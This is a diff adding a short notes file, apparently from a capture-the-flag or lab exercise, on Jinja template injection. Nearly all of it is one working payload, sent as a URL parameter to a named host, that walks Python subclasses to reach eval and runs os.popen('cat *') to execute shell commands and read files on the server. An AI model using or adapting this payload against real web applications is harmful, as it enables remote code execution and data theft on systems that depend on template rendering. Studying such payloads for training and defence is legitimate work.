@@ -1,0 +1,15 @@
+###jinja template injection
+###not much to do, try templates that scan methods for RCE
+
+###Template
+	http://edu.kaibro.tw:8000/?name={% for c in [].__class__.__base__.__subclasses__() %}
+	{% if c.__name__ == 'catch_warnings' %}
+	  {% for b in c.__init__.__globals__.values() %}  
+	  {% if b.__class__ == {}.__class__ %}
+	    {% if 'eval' in b.keys() %}
+	      {{ b['eval']('__import__("os").popen(“cat *“).read()') }}
+	    {% endif %}
+	  {% endif %}
+	  {% endfor %}
+	{% endif %}
+	{% endfor %}
